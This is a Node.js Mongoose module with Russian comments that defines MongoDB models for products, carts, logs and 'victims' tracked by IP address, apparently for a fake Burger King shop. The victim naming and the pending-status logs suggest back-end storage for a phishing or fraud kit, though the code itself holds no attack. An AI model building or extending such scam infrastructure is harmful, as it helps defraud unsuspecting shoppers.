const mongoose = require('mongoose');

// Локальная разработка - SQLite, Railway - MongoDB
const isProduction = process.env.NODE_ENV === 'production' || process.env.RAILWAY_ENVIRONMENT;
const isRailway = process.env.RAILWAY_ENVIRONMENT;

const mongoUrl = isRailway ? 
  process.env.MONGODB_URL || process.env.DATABASE_URL :
  'mongodb://localhost:27017/burgerking';

// Подключение к MongoDB
async function connectMongoDB() {
  try {
    await mongoose.connect(mongoUrl, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('✅ MongoDB подключена успешно');
    return true;
  } catch (error) {
    console.error('❌ Ошибка подключения к MongoDB:', error.message);
    return false;
  }
}

// Схемы для MongoDB
const victimSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  ip: { type: String, required: true },
  discount: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const productSchema = new mongoose.Schema({
  title: { type: String, required: true },
  description: { type: String, required: true },
  price: { type: Number, required: true },
  image: { type: String, required: true },
  tag: { type: String, required: true, unique: true },
  createdAt: { type: Date, default: Date.now }
});

const cartSchema = new mongoose.Schema({
  victimId: { type: String, required: true },
  productId: { type: String, required: true },
  title: { type: String, required: true },
  price: { type: Number, required: true },
  quantity: { type: Number, default: 1 },
  createdAt: { type: Date, default: Date.now }
});

const logSchema = new mongoose.Schema({
  victimId: { type: String, required: true },
  status: { type: String, default: 'pending' },
  data: { type: Object, default: {} },
  createdAt: { type: Date, default: Date.now }
});

// Модели
const Victims = mongoose.model('Victims', victimSchema);
const Products = mongoose.model('Products', productSchema);
const Carts = mongoose.model('Carts', cartSchema);
const Logs = mongoose.model('Logs', logSchema);

module.exports = {
  connectMongoDB,
  Victims,
  Products,
  Carts,
  Logs,
  mongoose
};
